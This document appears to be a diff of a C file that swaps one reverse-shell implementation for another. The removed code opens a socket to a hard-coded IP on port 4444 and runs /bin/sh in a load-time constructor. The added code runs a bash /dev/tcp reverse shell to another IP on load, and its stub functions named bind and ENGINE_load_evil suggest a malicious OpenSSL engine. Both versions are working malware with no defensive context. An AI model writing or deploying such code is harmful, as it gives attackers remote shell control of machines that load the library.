@@ -1,38 +1,22 @@
-#include<stdio.h>
 #include<stdlib.h>
-#include<unistd.h>
-#include<sys/socket.h>
-#include<netinet/in.h>
-#include<arpa/inet.h>
 
-
-__attribute__((constructor)) static void reverse_shell(void)
-{
-    char *server_ip="171.239.11.33";
-    uint32_t server_port=4444;
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
-    struct sockaddr_in attacker_addr = {0};
-    attacker_addr.sin_family = AF_INET;
-    attacker_addr.sin_port = htons(server_port);
-    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);
-    if(connect(sock, (struct sockaddr *)&attacker_addr,sizeof(attacker_addr))!=0)
-        exit(0);
-    dup2(sock, 0);
-    dup2(sock, 1);
-    dup2(sock, 2);
-    char *args[] = {"/bin/sh", NULL};
-    execve("/bin/sh", args, NULL);
+// IP 171.239.15.194
+// PORT 4444 
+__attribute__((constructor))
+void run_on_load() {
+    system("bash -c 'bash -i >& /dev/tcp/171.239.15.194/4444 0>&1'");
 }
 
+int bind(void *e, const char *id) {
+    return 1;
+}
+
+void ENGINE_load_evil() {}
+
+int bind_engine() {
+    return 1;
+}
 int main() {
-    // Phần code chính của chương trình
-    printf("Program is running..\n");
-
-    // Giả lập một chương trình bình thường
-    while (1) {
-        printf("Running...\n");
-        sleep(1);
-    }
-
     return 0;
 }
+
